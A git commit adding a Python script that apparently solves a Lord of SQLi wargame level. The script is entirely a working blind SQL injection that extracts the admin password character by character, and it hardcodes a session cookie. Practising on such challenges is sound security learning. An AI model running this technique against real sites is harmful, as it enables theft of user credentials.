ae64dc07a50d1496bb619beb521ba9c321169f33
repl.it user <replituser@example.com>
2021-01-21 09:07:39 +0000

    commitgit add .

---
+++ los_4.py
@@ -0,0 +1,35 @@
+import requests, time
+import urllib
+import urllib3
+
+flag = ''
+length= 0
+ 
+session = dict(PHPSESSID="o6eanf2bo08v2saogks4o19526")
+ 
+# find the length of PW 
+for i in range(0, 20):
+    try:
+        r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and length(pw)="+str(i)+"%23", cookies=session)
+    except:
+        print("exception")
+        continue
+    if 'Hello admin' in r.text: #true
+        length = i
+        break
+ 
+print("[+]  Length of admin pw : " + str(length))
+ 
+for j in range(1, length+1):
+    for i in range(48, 126):
+        try:
+            r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and substr(pw,"+str(j)+",1) ='"+ str(chr(i)), cookies=session)
+        except:
+            print("exception")
+            continue
+        if 'Hello admin' in r.text:
+            flag = flag + chr(i)
+            print("[+] finding pw : " + flag)
+            break
+        time.sleep(0.1)
+print("[+] pw of admin : " + flag)
